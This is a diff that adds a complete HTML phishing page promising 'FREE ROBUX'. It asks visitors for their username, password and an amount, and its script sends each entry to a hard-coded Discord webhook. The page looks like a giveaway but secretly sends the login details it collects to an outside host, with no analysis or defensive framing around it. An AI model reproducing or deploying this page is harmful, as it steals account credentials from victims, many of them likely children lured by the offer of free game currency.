@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>FREE ROBUX</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #0f172a;
+      color: white;
+    }
+
+    h1 {
+      font-size: 60px;
+      margin-top: 50px;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      gap: 40px;
+      margin-top: 50px;
+      flex-wrap: wrap;
+    }
+
+    .chat-box {
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 10px;
+      width: 250px;
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+
+    button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h1>FREE ROBUX</h1>
+
+  <div class="container">
+
+    <!-- Room 1 -->
+    <div class="chat-box">
+      <h2>USERNAME</h2>
+      <input id="msg1" placeholder="Type message...">
+      <br>
+      <button onclick="send('Room 1', 'msg1')">Confirm</button>
+    </div>
+
+    <!-- Room 2 -->
+    <div class="chat-box">
+      <h2>PASSWORD</h2>
+      <input id="msg2" placeholder="Type message...">
+      <br>
+      <button onclick="send('Room 2', 'msg2')">Confirm</button>
+    </div>
+
+    <!-- Room 3 -->
+    <div class="chat-box">
+      <h2>AMOUNT</h2>
+      <input id="msg3" placeholder="Type message...">
+      <br>
+      <button onclick="send('Room 3', 'msg3')">Confirm</button>
+    </div>
+
+  </div>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1497667519954157731/HuZbnPzqyWbYAO3dmU4VDAChlU5FwzkD3feGyqqoYg23PcojXr42vnLukIIEThH_27TA";
+
+    function send(room, inputId) {
+      const message = document.getElementById(inputId).value;
+
+      if (!message) return;
+
+      fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `[${room}] ${message}`
+        })
+      });
+
+      document.getElementById(inputId).value = "";
+    }
+  </script>
+
+</body>
+</html>
